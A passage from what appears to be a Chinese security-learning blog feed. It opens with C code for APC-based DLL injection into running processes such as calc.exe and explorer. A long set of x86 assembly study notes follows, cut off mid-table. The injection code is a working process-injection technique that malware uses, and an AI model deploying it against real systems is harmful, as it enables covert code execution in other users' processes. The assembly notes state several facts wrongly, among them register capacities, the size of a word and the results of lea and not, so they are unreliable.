apcinject(int pid,WCHAR *dll) {        HANDLE openprocess = OpenProcess(PROCESS_ALL_ACCESS,0 ,pid);        if (openprocess == 0) {               GetErr();        }        else {               printf(&quot;[*] OpenProcess Sucess\n&quot;);        }        LPVOID vt = VirtualAllocEx(openprocess, 0, 1024, MEM_COMMIT,  PAGE_EXECUTE_READWRITE);        if (vt == 0) {               printf(&quot;[-] VirtualAllocEx faliure\n&quot;);               GetErr();        }        else {               printf(&quot;[*] VirtualAllocEx Sucess\n&quot;);        }        SIZE_T dwRet;        bool write = WriteProcessMemory(openprocess, vt, dll, MAX_PATH, &amp;dwRet);        if (write == 0) {               printf(&quot;[-] WriteProcessMemory faiure&quot;);               GetErr();        }        else {               printf(&quot;[*] WriteProcessMemory Sucess\n&quot;);        }        THREADENTRY32 te = { sizeof(te) };        HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);        if (handleSnap == INVALID_HANDLE_VALUE)        {               printf(&quot;[-] CreateToolhelp32Snapshot faiure&quot;);               GetErr();        }else {               printf(&quot;[*] CreateToolhelp32Snapshot Sucess\n&quot;);               /*               if (Thread32First(handleSnap, &amp;te))               {                       do {                              if (te.th32OwnerProcessID == pid)                              {                                      printf(&quot;%d\n&quot;, te.th32OwnerProcessID);                              }                       } while (Thread32Next(handleSnap, &amp;te));               }                       */               for (bool td = Thread32First(handleSnap, &amp;te);td;td =  Thread32Next(handleSnap, &amp;te)) {                       if (te.th32OwnerProcessID == pid) {                              int tid = te.th32ThreadID;                              HANDLE openthread = OpenThread(THREAD_ALL_ACCESS, 0, tid);                              if (openthread == 0) {                                      printf(&quot;[-] OpenThread faiure&quot;);                                      GetErr();                              }                              else {                                      printf(&quot;[*] OpenThread Sucess threadid:%d\n&quot;,tid);                                      DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW,  openthread, (ULONG_PTR)vt);                                      if (dwRet == 0) {                                             printf(&quot;[-] QueueUserAPC failure\n&quot;);                                             GetErr();                                      }                                      else {                                             printf(&quot;[+] APC Dll inject Sucess\n&quot;);                                      }                              }                       }               }        }        return true;}int main(){        WCHAR *name = TEXT(&quot;calc.exe&quot;);        WCHAR *dll = TEXT(&quot;C:\\Users\\JiuShi\\Desktop\\testdll.dll&quot;);        int pid = getprocess(name);        if (pid != 0) {               apcinject(pid, dll);        }        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/09/24/wzcGgU.png" alt=""></p><p>试了一下，explorer、calc都能注</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>汇编学习总结</title>
      <link href="/posts/7a38fa87.html"/>
      <url>/posts/7a38fa87.html</url>
      <content type="html"><![CDATA[<p>好久没看汇编了，怕忘。复习一下顺便写一下总结</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>汇编语言（Assembly Language）是任何一种用于电子计算机、微处理器、微控制器或其他可编程器件的低级语言，亦称为符号语言。在汇编语言中，用助记符代替机器指令的操作码，用地址符号或标号代替指令或操作数的地址。在不同的设备中，汇编语言对应着不同的机器语言指令集，通过汇编过程转换成机器指令。特定的汇编语言和特定的机器语言指令集是一一对应的，不同平台之间不可直接移植</p></blockquote><p>一个CPU的构成，简单的来说：</p><ul><li>汇编架构</li><li>CPU厂家自身的指令</li></ul><p>常见的汇编架构：</p><ul><li>X86</li><li>ARM</li><li>MIPS</li><li>AVR<br>……</li></ul><p>每一个汇编架构的指令都有所不同，这里主要是x86框架的指令。</p><h2 id="x86的历史"><a href="#x86的历史" class="headerlink" title="x86的历史"></a>x86的历史</h2><blockquote><p>1978年6月8日，Intel发布了新款16位微处理器“8086”，也同时开创了一个新时代：x86架构诞生了。x86指的是特定微处理器执行的一些计算机语言指令集，定义了芯片的基本使用规则，一如今天的x64、IA64等。</p></blockquote><blockquote><p>86指令集是美国Intel公司为其第一块16位CPU(i8086)专门开发的，美国IBM公司1981年推出的世界第一台PC机中的CPU–i8088(i8086简化版)使用的也是X86指令，同时电脑中为提高浮点数据处理能力而增加的X87芯片系列数学协处理器则另外使用X87指令，以后就将X86指令集和X87指令集统称为X86指令集。虽然随着CPU技术的不断发展，Intel陆续研制出更新型的i80386、i80486直到今天的Pentium 4(以下简为P4)系列，但为了保证电脑能继续运行以往开发的各类应用程序以保护和继承丰富的软件资源，所以Intel公司所生产的所有CPU仍然继续使用X86指令集，所以它的CPU仍属于X86系列。</p></blockquote><h3 id="x64-x86"><a href="#x64-x86" class="headerlink" title="x64-x86"></a>x64-x86</h3><blockquote><p>x86-64（ 又称x64，即英文词64-bit extended，64位拓展 的简写）是<strong>x86架构</strong>的64位拓展，向后兼容于16位及32位的x86架构。x64于1999年由AMD设计，AMD首次公开64位集以扩展给x86，称为“AMD64”。其后也为英特尔所采用，现时英特尔称之为“Intel 64”，在之前曾使用过“Clackamas Technology” (CT)、“IA-32e”及“EM64T”。<br>苹果公司和RPM包管理员以“x86-64”或“x86_64”称呼此64位架构。甲骨文公司及Microsoft称之为“x64”。BSD家族及其他Linux发行版则使用“x64-64”，32位版本则称为“i386”（或 i486/586/686），Arch Linux用x86_64称呼此64位架构。</p></blockquote><h2 id="高等语言的执行过程"><a href="#高等语言的执行过程" class="headerlink" title="高等语言的执行过程"></a>高等语言的执行过程</h2><p>C:<br>编译好的程序-&gt;汇编-&gt;指令</p><p>越高级的语言执行过程越慢，但是处理好的另说</p><h2 id="汇编语言的组成"><a href="#汇编语言的组成" class="headerlink" title="汇编语言的组成"></a>汇编语言的组成</h2><p>汇编指令： 机器码的助记符，有对应的机器码<br>伪指令：没有对应的机器码，由编译器执行，计算机并不执行<br>其他符号：+、-、<code>*</code>、/等，由编译器识别，没有对应的机器码</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>CPU:<br>CPU是计算机的核心部件，控制整个计算机的工作。让一个CPU工作 必须向CPU提供指令和数据，指令和数据在存储器中存放（平时说的内存） 磁盘不同内存，磁盘上的数据或程序不读到内存中就无法被CPU使用。</p><p>控制器：控制器控制各种器件进行工作<br>运算器：运算器进行信息处理</p><p>（以16位CPU举例）<br>CPU的总线：</p><ul><li><p>地址总线：用于寻找地址，然后给出内存地址</p><ul><li>地址总线寻址能力的计算公式：2x地址总线数量根=数据总线宽度 </li></ul></li><li><p>数据总线：用于传输数据</p><ul><li>CPU的读写根据总线进行操作<br>8根数据总线一次可以传送一个8位二进制数据 16位数据总线一次可以传送两个8位二进制数据 32位数据总线一次可以传送三个8位二进制数</li></ul></li><li><p>控制总线：用于控制CPU之外的物理设备<br>用于控制CPU之外的物理设备，所谓的内存读写都是由控制线操控并发送 其中一根负责：读信号输出，控制CPU向外传送读信号 另外一根负责：写信号输出，控制CPU向外传送写信号<br>PCIE、PCIEX、PCIEX6之类接口外部设备的数据传输</p></li></ul><p>几位的CPU一次可以传输对应位数的数据 <em> 16位CPU一次性可以处理16位的数据 </em> 寄存器的最大宽度为16位 * CPU和寄存器之间通路是16位    </p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>寄存器是干啥的：寄存器信息存储<br>不同的CPU、寄存器的数量和结构都不同</p><p>通用寄存器：</p><ul><li>16位CPU：AX、BX、CX、DX</li><li>x86：EAX、EBX、ECX、EDX</li><li>x64：RAX、RBX、RCX、RDX</li></ul><p>寄存器的高低位：<br>示例-&gt;<br>16位：AX 高：AH 低：AL<br>32位：EAX 高：AX 低:AH<br>64位：RAX 高:EAX 低：AX</p><p>高低位的存储:</p><pre><code>mov ah,64H</code></pre><p>此时AX：6400<br>AH:64 AL:00</p><p>兼容性:<br>高位寄存器会兼容低位寄存器，例如一个16位寄存器的由两个 8位寄存器组成，则32位寄存器由一个16位寄存器和一个高8位寄存器组成（EAX由：AX和AH组成）。</p><h3 id="寄存器的大小和计算"><a href="#寄存器的大小和计算" class="headerlink" title="寄存器的大小和计算"></a>寄存器的大小和计算</h3><p>一个16位寄存器只能存放4个字节 一个32位寄存器只能存放8个字节 一个64位寄存器只能存放16个字节<br>传输问题：<br>字单位：word<br>一个字等于两个字节：1 word=2B<br>8位寄存器传输一个字要传输两次，16位寄存器只需要传输一次<br>一个字在16位寄存器中，自然就存在这个寄存器中的高8位寄存器和低8位寄存器</p><p>寄存器的范围:</p><pre><code>16位寄存器的范围：0000~FFFF32位寄存器的范围：00000000~FFFFFFFF64位寄存器的范围：0000000000000000~FFFFFFFFFFFFFFFF</code></pre><p>常见的计算：</p><pre><code>mov eax, 4C0Hmov ebx, 26CHadd eax, ebxmov data,</code></pre><p>结果位：0000072C<br><img src="https://s1.ax1x.com/2020/09/21/wqkGqA.png" alt=""></p><p>如果计算超过最大范围：<br>8位寄存器计算</p><pre><code> MOV AL,96h MOV BH,99h add AL,BH</code></pre><p>结果为：12F,由于8位寄存器只能放两个字节。所以舍弃到前一位字节，最后AL=2F<br>如果计算范围超过寄存器接受最大范围从左往右舍弃，直到可以接受的范围<br><img src="https://s1.ax1x.com/2020/09/21/wqEqgO.png" alt=""></p><h3 id="寄存器分类"><a href="#寄存器分类" class="headerlink" title="寄存器分类"></a>寄存器分类</h3><p>寄存器分为：</p><ul><li>段寄存器</li><li>常用寄存器</li><li>特殊寄存器</li></ul><p>通用寄存器说明:</p><ul><li>AX累加器</li><li>CX循环次数</li><li>DX除法计算存储器</li><li>BX乘法计算存储器</li></ul><p>段寄存器:</p><ul><li><p>CS:IP</p><ul><li>通过CS：IP寻找存放的指令</li><li>CS为段地址，IP为偏移地址</li><li>每次执行一条指令IP+3</li><li>计算物理地址公式： 物理地址=段地址x10（十六进制的10即为十进制的16）+偏移地址</li></ul></li><li><p>DS:IP</p><ul><li>通过DS：IP寻找存放的数据</li><li>DS为段地址，IP为偏移地址</li></ul></li><li><p>SS:SP</p><ul><li>SS：SP放着栈段的内存地址</li><li>SS为段地址，SP为偏移地址</li></ul></li><li><p>DS:SI</p><ul><li>相对基址变址寻址</li></ul></li><li><p>DSI:DI</p><ul><li>相对基址变址寻址</li></ul></li><li><p>ES:IP</p><ul><li>扩展寄存器，附加段寄存器ES：存放当前执行程序中一个辅助数据段的段地址。 段寄存器 偏移地址寄存器</li></ul></li></ul><h2 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h2><p>CPU访问内存单元时，要给出内存单元的地址。所以的内存单元构成的存储空间是一个以维的线性空间<br>每一个内存单元在这个空间都有唯一的地址，这个唯一的地址叫物理地址</p><p>CPU通过地址总线收入存储器的，必须是一个内存单元的物理地址</p><p>16寻找物理地址过程如下:<br>1.CPU中的相关部件提供两个对应CPU位数的地址时，一个称为段地址，另一个称为偏移地址<br>2.段地址和偏移地址通过内部总线收送入一个称为地址加法器的部件<br>3.地址加法器将两个地址合成一个物理地址<br>4.地址加法器通过内部总线将物理地址送入输入输出控制电路<br>5.输入输出控制电路将物理地址送上地址总线<br>6.物理地址被地址总线传到存储器</p><h2 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h2><p>8086CPU寻址如下：<br>8086CPU有20位地址总线，可以传送20位地址，达到1MB寻址能力。8086CPU又是16位结构，<br>在内部一次性处理、传输、暂存的地址都是16位。16位CPU的内部结构来看，如果将地址从内部<br>简单地发出，那么它只能送出16位的地址，寻址能力只有64KB</p><p>只有16位CPU要寻址，原因:16 cpu总线20位最大1mb，但是寄存器是16位的，所以需要段寄存器来寻址，要不然只能访问640kb<br>寻址大小计算公式：2的x次方/1024</p><p>32位找物理地址的方法：<br>32位CPU有32根地址线百，物理地址=<code>2**32=4294967296=4GB</code>,但是在实际应用中，PCI内存范围度占用了大量的地址范围——接近750MB，导致最后系统物理地问址只有3.25GB左右。CPU过渡到32位以后,寻址时就不答用段地址来寻址了,32位寄存器可以访问所有版的4G地址，所以你那个每个段大小的问题是没有意义权的。<br>(这里的**32，代表2的32次方)</p><p>其实32位cpu照样可以使用超过4gb的内存，某种技术</p><h2 id="指令和数据"><a href="#指令和数据" class="headerlink" title="指令和数据"></a>指令和数据</h2><p>指令和数据没有区别，CPU有时候把内容当做指令有时候把内容当做数据 他们都存储在内存或磁盘中。两者都是二进制</p><h2 id="内存和单元"><a href="#内存和单元" class="headerlink" title="内存和单元"></a>内存和单元</h2><p>存储器被划分成若干个存储单元，每个存储单元从0开始编号。例如一个存储器有128个存储单元 编号：0到127</p><h2 id="常见的容量单位"><a href="#常见的容量单位" class="headerlink" title="常见的容量单位"></a>常见的容量单位</h2><p>常见的容量单位： 1KB=1024B 1MB=1024KB 1GB=1024MB 1TB=1024GB 比特：bit 字节：byte 字：word 1byte=8bit 1word=4byte</p><h2 id="内存地址空间"><a href="#内存地址空间" class="headerlink" title="内存地址空间"></a>内存地址空间</h2><p>内存地址分段</p><ul><li>CPU在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据</li><li>每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间 （某段的地址空间代表着不同的物理设备，假设0~7FFFH空间的代表的是内存的，地址8000H~9FFFH代表的是显存的空间）（内存地址空间是根据不同系统的不同规定）</li><li>（在DOS里）比较安全的一个内存段是：0:200~0:300这个内存地址是无任何数据的，相对安全</li></ul><p>所有的物理存储器被看作一个由若干存储单元组成的逻辑存储器</p><p>物理地址：<br>CPU访问内存单元时，要给出内存单元的地址。所以的内存单元构成的存储空间是一个以维的线性空间 每一个内存单元在这个空间都有唯一的地址，这个唯一的地址叫物理地址 CPU通过地址总线收入存储器的，必须是一个内存单元的物理地址</p><h2 id="编写汇编的工具"><a href="#编写汇编的工具" class="headerlink" title="编写汇编的工具"></a>编写汇编的工具</h2><ul><li>Masm for Windows 集成实验环境</li><li>RadASM</li><li>Vs</li></ul><h2 id="常见的汇编格式"><a href="#常见的汇编格式" class="headerlink" title="常见的汇编格式"></a>常见的汇编格式</h2><pre><code class="asm">DATAS SEGMENT    ;此处输入数据段代码  DATAS ENDSSTACKS SEGMENT    ;此处输入堆栈段代码STACKS ENDSCODES SEGMENT    ASSUME CS:CODES,DS:DATAS,SS:STACKSSTART:    MOV AL,96h    MOV BH,99h    add AL,BH    ;此处输入代码段代码    MOV AH,4CH    INT 21HCODES ENDS    END START</code></pre><p>定义一个段</p><pre><code>&lt;name&gt; SEGMENT .....&lt;name&gt; ENDS</code></pre><p>每个编辑器的命名都有所不同，单都大致相同</p><pre><code>DATAS SEGMENT    ;此处输入数据段代码  DATAS ENDSSTACKS SEGMENT    ;此处输入堆栈段代码STACKS ENDSCODES SEGMENT    ASSUME CS:CODES,DS:DATAS,SS:STACKSSTART:    ;汇编指令CODES ENDS    END START</code></pre><h2 id="汇编程序编译"><a href="#汇编程序编译" class="headerlink" title="汇编程序编译"></a>汇编程序编译</h2><p>编译可以直接通过工具自带的编译，直接编译好exe。或者用masm进行编译<br>（工具直接编译好的结果如下）<br><img src="https://s1.ax1x.com/2020/09/21/wqU8yQ.png" alt=""></p><ul><li>obj文件是编译时产生的生文件（交叉引用的文件，又可以称为中间文件）</li><li>lst是链接文件</li><li>exe是最后编译成功产生的文件</li></ul><h2 id="常见的汇编指令"><a href="#常见的汇编指令" class="headerlink" title="常见的汇编指令"></a>常见的汇编指令</h2><table style="border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 186px;"><col style="width: 312px;"><col style="width: 413px;"></colgroup><tbody><tr><td style="background-color: rgb(253, 123, 57); border: 1px solid rgb(246, 84, 3); width: 186px; padding: 8px;"><div>指令</div></td><td style="background-color: rgb(253, 123, 57); border: 1px solid rgb(246, 84, 3); width: 312px; padding: 8px;"><div>功能</div></td><td style="background-color: rgb(253, 123, 57); border: 1px solid rgb(246, 84, 3); width: 413px; padding: 8px;"><div>例子</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>mov</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>赋值给寄存器</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,60 #将ax赋给ax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>add</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>加法计算</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>add ax,ax #将ax的值加给ax=ax+ax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jmp</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>跳转到指定位置</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>jmp 03C82 #跳转到03C82内存地址</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>int</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>用于中断某些东西，例如int 0中断程序返回0。int 3常用于DEBUG程序，触发为3的时候会调用debug服务</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>int 3</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>inc</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>用于将目标操作数+1</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>inc ax</div><div>inc eas</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>sub</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><span style="font-size: 14px;">不带借位的减法指令</span></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>sub ax,bx #ax=ax-bx，ax减去bx的值</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>push</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>入栈</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>push AX #将ax入栈</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>pop</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>出栈</div></td><td style="width: 413px; padding: 8px; border: 1px solid;">pop ax #将栈顶的数据出栈到ax</td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>int</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>程序返回</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>int &lt;code&gt;，例如int 21H，从CPU将控制权返回给程序</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dec</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>减一指令，用于将目标操作数减一</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>dec ax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dw</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>定义字型数据</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>dw 4657H,3214H,0123H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>or</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">或指令</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>or al,423CH&nbsp;<img src="汇编指令_files/Image.png" type="image/png" data-filename="Image.png"></div><div><img src="汇编指令_files/Image [1].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>db</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>定义字节型数据</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>db ‘unIX’相当于db 75H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>ptr</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>类型临时转换，格式：[類型] ptr [寄存器或地址單元] ，指令調用的其他寄存器也要復合類型才行</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov word ptr [BX],AX</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>div、idiv（帶符號的除數）</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>除法（需要定义类型）</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>div byte ptr [BX]</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dd</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>定义double word类型数据</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>dd 1001H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dup</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>定义一个范围的值</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>dd 200 dup (0)</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>lea</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>從一個有效地址取值給寄存器，只能是地址取值，不能是寄存器取值</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov bx,0002H</div><div>mov ax,4C20H</div><div>mov DS:[BX],4C20H</div><div>lea CX,DS:[BX]</div><div>;CX=4C20H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>call</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>無條件跳轉到指令處並開始執行和jmp很像</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov eax,esp</div><div>call eax #執行eax放的棧地址</div><div><br></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dec</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">寄存器或值減一</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov eax,4C00178H</div><div>dec eax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>mul、imul（帶符號的陳數）</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">乘法</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,1234H</div><div>mov bx,2H</div><div>mul bx</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>xor</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">異或運算</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,4C21H</div><div>xor ax,0</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>not</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">翻轉操作數中的所有位</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,2B3CH</div><div>not al ;AX=3C2BH</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>neg</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>求補運算</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,2B3CH</div><div>neg ax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>shl</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>將一個寄存器或內存單元中的數據左移一位</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,2B3CH</div><div>shl al,1 ;將al中數據左移一位（1是移幾位）</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>shr</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>將一個寄存器或內存單元中的數據右移一位</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,2B3CH</div><div>shr ah,1 ;將al中數據右移一位（1是移幾位）</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>cmp</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>對比指令</div><div>计算 操作对象1 - 操作对象2 但不保存结果，只是根据结果修改相应的标志位</div><div>（p是比较指令,cmp的功能相当于减法指令。它不保存结果，只是影响相应的标志位。其他的指令通过识别这些被影响的标志位来得知比较结果。）</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>；死循環例</div><div>@test:xor ax,ax</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov ax,100H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov bx,50H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;cmp ax,bx</div><div>&nbsp;&nbsp;&nbsp;&nbsp;jne @test ;不等於則跳轉到test標準</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>je</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>相等則跳轉</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>@test:xor ax,ax</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov ax,100H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov bx,50H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;cmp ax,ax</div><div>&nbsp;&nbsp;&nbsp;&nbsp;je @test ;等於則跳轉到test標準</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jmp</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>無條件跳轉</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,100H</div><div>mov word ptr bx,ax</div><div>jmp @test</div><div>mov cx,04H</div><div>@test: mov ax,0H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jz</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>為0則跳轉</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,0H</div><div>cmp ax,ax</div><div>jz @test</div><div>mov bx,6C43H</div><div>@test: mov ax,6644H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jg</div><div>jng #無無符號數字判斷</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">有符號大於則跳轉</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>&nbsp;&nbsp;&nbsp;&nbsp;mov ax,400H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov bx,200H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;cmp ax,bx</div><div>&nbsp;&nbsp;&nbsp;&nbsp;jg @test</div><div>&nbsp;&nbsp;&nbsp;&nbsp;xor ax,ax</div><div>@test:mov bx,600H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jl</div><div>jnl #無符號小於則跳轉</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>有符號小於的則跳轉</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>&nbsp; &nbsp; mov ax,400H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov bx,200H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;cmp bx,ax</div><div>&nbsp;&nbsp;&nbsp;&nbsp;jl @test</div><div>&nbsp;&nbsp;&nbsp;&nbsp;xor ax,ax</div><div>@test:mov bx,600H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>loop</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>循环，cx存放循环次数</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,3</div><div>mov cx,2 ;循环两次</div><div>s:add ax,ax</div><div>loop s</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>ret</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>用栈中所保存的数据赋值给IP的，(CS:IP)jump 跳转回来（注意：跳转到指定的地址后，跳转后地址的那条指令是不会执行的）</div><div><img src="汇编指令_files/Image [2].png" type="image/png" data-filename="Image.png"></div><div><br></div><div>IP = ss<em>10(16进制的10) + sp （保存的值出栈， 复制给IP）</em></div><div>sp = sp +2</div><div><br></div><div>这写shellcode的时候，找到函数地址用于返回函数地址</div><div><br></div><div>比如栈顶最上面有12345678h的值，那么ret之后。就是把12345678h pop到IP，在x86为EIP</div><div><br></div><div>堆栈</div><div>12345678h</div><div><br></div><div>ret前</div><div>EAX&nbsp;=&nbsp;12345678 EBX&nbsp;=&nbsp;7EFDE000 ECX&nbsp;=&nbsp;00000000 EDX&nbsp;=&nbsp;00F21005 ESI&nbsp;=&nbsp;00000000 EDI&nbsp;=&nbsp;00000000 EIP&nbsp;=&nbsp;00F21018 ESP&nbsp;=&nbsp;002AFC90 EBP&nbsp;=&nbsp;002AFC94 EFL&nbsp;=&nbsp;00000244</div><div><br></div><div>ret后</div><div>EAX&nbsp;=&nbsp;12345678 EBX&nbsp;=&nbsp;7EFDE000 ECX&nbsp;=&nbsp;00000000 EDX&nbsp;=&nbsp;00F21005 ESI&nbsp;=&nbsp;00000000 EDI&nbsp;=&nbsp;00000000 EIP&nbsp;=&nbsp;12345678 ESP&nbsp;=&nbsp;002AFC94 EBP&nbsp;=&nbsp;002AFC94 EFL&nbsp;=&nbsp;00010244</div><div><br></div><div>堆栈</div><div>&lt;空&gt;</div><div><br></div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>假设栈顶最后4个字节（8086汇编）将赋给IP，跳转到对应的物理地址往下执行</div><div><img src="汇编指令_files/Image [3].png" type="image/png" data-filename="Image.png"></div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,264CH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV BX,3682H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;PUSH AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;PUSH BX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV CX,2</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,SS</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV DS,AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV BX,SP</div><div>&nbsp;&nbsp;&nbsp;&nbsp;MOV AX,DS:[BX]</div><div>XH: ADD AX,AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;LOOP XH</div><div>&nbsp;&nbsp;&nbsp;&nbsp;POP BX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;POP DX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;PUSH AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;XOR AX,AX</div><div>&nbsp;&nbsp;&nbsp;&nbsp;RET</div><div><br></div><div><img src="汇编指令_files/Image [4].png" type="image/png" 